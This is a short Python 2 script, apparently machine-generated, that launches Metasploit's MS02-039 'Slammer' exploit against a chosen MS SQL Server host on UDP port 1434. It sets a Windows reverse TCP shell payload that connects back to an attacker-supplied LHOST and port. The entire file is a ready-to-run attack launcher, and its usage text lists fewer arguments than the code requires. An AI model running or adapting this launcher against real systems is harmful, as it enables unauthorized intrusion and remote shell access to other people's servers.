#!/usr/bin/env python2
#  -*- coding: utf-8 -*- ####################################################################################
# MS02-039_mssql                                                                                            #
#                                                                                                           #
# DESCRIPTION                                                                                               #
# Auto generated by msf_gen.py                                                                              #
#                                                                                                           #
#############################################################################################################

import signal
import sys
import os

# Handler to exist cleanly on ctrl+C
def signal_handler(signal, frame):
    print("\nYou pressed Ctrl+C!")
    sys.exit()
signal.signal(signal.SIGINT, signal_handler)

def exploit():

   command = """echo y | msfconsole -x "exploit/windows/mssql/ms02_039_slammer;set RHOSTS %s;set RPORT %s;set USERNAME %s;set PASSWORD %s;set PAYLOAD windows/shell/reverse_tcp;set LHOST %s;set LPORT %s;run" """ % (HOST, RPORT,USERNAME, PASSWORD, LHOST, LPORT)
   os.system(command)

def print_usage():
   print ("""MS02-039_mssql""")

   print("Usage: %s <HOST> <LHOST> <LPORT>" % (sys.argv[0]))
   print("EXAMPLE: MS02-039_mssql '127.0.0.1' 10.100.12.xx 1337 <USERNAME> <PASSWORD>\n")
   sys.exit(0)

if __name__ == '__main__':

    if len(sys.argv) != 6:
       print_usage()

    HOST = sys.argv[1]
    LHOST = sys.argv[2]
    LPORT = sys.argv[3]
    USERNAME = sys.argv[4]
    PASSWORD = sys.argv[5]
    RPORT = '1434'

    if os.path.isfile('/usr/bin/msfconsole') is False:
       print('ERROR: Please install metasploit for run this PoC.')
       sys.exit(1)

    exploit()
